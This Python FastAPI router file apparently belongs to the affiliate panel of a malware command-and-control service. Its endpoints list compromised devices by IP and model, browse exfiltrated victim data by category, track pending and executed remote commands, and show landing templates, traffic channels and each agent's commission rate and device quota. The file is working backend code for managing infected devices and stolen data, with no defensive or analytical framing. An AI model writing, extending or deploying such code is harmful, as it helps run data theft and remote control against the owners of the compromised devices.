from fastapi import APIRouter, Depends, Query
from sqlalchemy.orm import Session
from sqlalchemy import desc, func, or_
from datetime import datetime, timedelta
from typing import Optional

from ...database import get_db, Device, DeviceGroup, TrafficChannel, LandingTemplate, ExfilData, Command
from ...agent_auth import get_current_agent, Agent
from .._helpers import serialize_device, serialize_group, serialize_channel, serialize_template
from ...config_constants import cfg_int

router = APIRouter(prefix="/api/agent", tags=["agent-devices"], redirect_slashes=False)


@router.get("/devices")
async def agent_list_devices(
    skip: int = 0, limit: int = 100, search: Optional[str] = None, status: Optional[str] = None,
    group_id: Optional[int] = None, channel_id: Optional[int] = None, template_id: Optional[int] = None,
    db: Session = Depends(get_db), current_agent: Agent = Depends(get_current_agent)
):
    q = db.query(Device).filter(Device.agent_id == current_agent.id)
    if search and search.strip():
        kw = f"%{search.strip()}%"
        q = q.filter(or_(Device.device_uuid.like(kw), Device.ip.like(kw), Device.device_model.like(kw), Device.note.like(kw)))
    if status: q = q.filter(Device.status == status)
    if group_id is not None: q = q.filter(Device.group_id == int(group_id))
    if channel_id is not None: q = q.filter(Device.channel_id == int(channel_id))
    if template_id is not None: q = q.filter(Device.template_id == int(template_id))
    total = q.count()
    rows = q.order_by(desc(Device.last_seen)).offset(skip).limit(limit).all()
    return {"total": total, "items": [serialize_device(d) for d in rows]}


@router.get("/devices/{device_uuid}")
async def agent_get_device(device_uuid: str, db: Session = Depends(get_db), current_agent: Agent = Depends(get_current_agent)):
    d = db.query(Device).filter(Device.device_uuid == device_uuid, Device.agent_id == current_agent.id).first()
    if not d:
        from fastapi import HTTPException
        raise HTTPException(404, "Device not found")
    return serialize_device(d)


@router.get("/devices/stats")
async def agent_device_stats(db: Session = Depends(get_db), current_agent: Agent = Depends(get_current_agent)):
    total = db.query(func.count(Device.id)).filter(Device.agent_id == current_agent.id).scalar() or 0
    active = db.query(func.count(Device.id)).filter(Device.agent_id == current_agent.id, Device.status == "active").scalar() or 0
    offline = db.query(func.count(Device.id)).filter(Device.agent_id == current_agent.id, Device.status == "offline").scalar() or 0
    total_exfil = db.query(func.count(ExfilData.id)).join(Device, ExfilData.device_uuid == Device.device_uuid).filter(Device.agent_id == current_agent.id).scalar() or 0
    total_cmds = db.query(func.count(Command.id)).join(Device, Command.device_uuid == Device.device_uuid).filter(Device.agent_id == current_agent.id).scalar() or 0
    return {"total_devices": int(total), "active_devices": int(active), "offline_devices": int(offline),
            "total_exfil": int(total_exfil), "total_commands": int(total_cmds)}


@router.get("/groups")
async def agent_list_groups(db: Session = Depends(get_db), current_agent: Agent = Depends(get_current_agent)):
    rows = db.query(DeviceGroup).filter((DeviceGroup.agent_id == current_agent.id) | (DeviceGroup.agent_id.is_(None))).all()
    return {"items": [serialize_group(g, db) for g in rows]}


@router.get("/channels")
async def agent_list_channels(db: Session = Depends(get_db), current_agent: Agent = Depends(get_current_agent)):
    rows = db.query(TrafficChannel).filter(TrafficChannel.agent_id == current_agent.id).order_by(desc(TrafficChannel.id)).all()
    return {"items": [serialize_channel(c, db) for c in rows]}


@router.get("/templates")
async def agent_list_templates(db: Session = Depends(get_db), current_agent: Agent = Depends(get_current_agent)):
    rows = db.query(LandingTemplate).filter((LandingTemplate.agent_id == current_agent.id) | (LandingTemplate.agent_id.is_(None))).order_by(desc(LandingTemplate.id)).all()
    return {"items": [serialize_template(t) for t in rows]}


@router.get("/exfil")
async def agent_list_exfil(
    skip: int = 0, limit: int = 100, category: Optional[str] = None,
    device_uuid: Optional[str] = None,
    db: Session = Depends(get_db), current_agent: Agent = Depends(get_current_agent)
):
    q = db.query(ExfilData).join(Device, ExfilData.device_uuid == Device.device_uuid).filter(Device.agent_id == current_agent.id)
    if category: q = q.filter(ExfilData.category == category)
    if device_uuid: q = q.filter(ExfilData.device_uuid == device_uuid)
    total = q.count()
    rows = q.order_by(desc(ExfilData.uploaded_at)).offset(skip).limit(limit).all()
    items = []
    for e in rows:
        d = {c.name: getattr(e, c.name) for c in e.__table__.columns}
        if isinstance(d.get("uploaded_at"), datetime):
            d["uploaded_at"] = d["uploaded_at"].isoformat()
        items.append(d)
    return {"total": total, "items": items}


@router.get("/commands")
async def agent_list_commands(
    skip: int = 0, limit: int = 100, device_uuid: Optional[str] = None, status: Optional[str] = None,
    db: Session = Depends(get_db), current_agent: Agent = Depends(get_current_agent)
):
    q = db.query(Command).join(Device, Command.device_uuid == Device.device_uuid).filter(Device.agent_id == current_agent.id)
    if device_uuid: q = q.filter(Command.device_uuid == device_uuid)
    if status: q = q.filter(Command.status == status)
    total = q.count()
    rows = q.order_by(desc(Command.created_at)).offset(skip).limit(limit).all()
    items = []
    for c in rows:
        d = {col.name: getattr(c, col.name) for col in c.__table__.columns}
        for k in ("created_at", "executed_at"):
            if isinstance(d.get(k), datetime):
                d[k] = d[k].isoformat()
        items.append(d)
    return {"total": total, "items": items}


@router.get("/dashboard/stats")
async def agent_dashboard_stats(db: Session = Depends(get_db), current_agent: Agent = Depends(get_current_agent)):
    today = datetime.now().date()
    today_start = datetime.combine(today, datetime.min.time())
    total_devices = db.query(func.count(Device.id)).filter(Device.agent_id == current_agent.id).scalar() or 0
    active_minutes = max(1, int(cfg_int(db, "device.active_device_minutes")))
    active_cutoff = datetime.now() - timedelta(minutes=active_minutes)
    active_devices = db.query(func.count(Device.id)).filter(Device.agent_id == current_agent.id, Device.last_seen >= active_cutoff).scalar() or 0
    total_exfil = db.query(func.count(ExfilData.id)).join(Device, ExfilData.device_uuid == Device.device_uuid).filter(Device.agent_id == current_agent.id).scalar() or 0
    pending_cmds = db.query(func.count(Command.id)).join(Device, Command.device_uuid == Device.device_uuid).filter(Device.agent_id == current_agent.id, Command.status == "pending").scalar() or 0
    today_exfil = db.query(func.count(ExfilData.id)).join(Device, ExfilData.device_uuid == Device.device_uuid).filter(Device.agent_id == current_agent.id, ExfilData.uploaded_at >= today_start).scalar() or 0
    return {
        "total_devices": int(total_devices), "active_devices": int(active_devices),
        "total_exfil": int(total_exfil), "pending_commands": int(pending_cmds),
        "today_exfil": int(today_exfil),
    }


@router.get("/profile")
async def agent_profile(current_agent: Agent = Depends(get_current_agent)):
    return {
        "id": current_agent.id, "username": current_agent.username,
        "name": current_agent.name, "contact": current_agent.contact,
        "phone": current_agent.phone, "enabled": int(current_agent.enabled if current_agent.enabled is not None else 1),
        "max_devices": current_agent.max_devices or 0,
        "commission_rate": current_agent.commission_rate or 0,
        "notes": current_agent.notes,
        "last_login": current_agent.last_login.isoformat() if current_agent.last_login else None,
        "last_login_ip": current_agent.last_login_ip,
        "google_2fa_enabled": int(current_agent.google_2fa_enabled or 0),
        "created_at": current_agent.created_at.isoformat() if current_agent.created_at else None,
        "updated_at": current_agent.updated_at.isoformat() if current_agent.updated_at else None,
    }
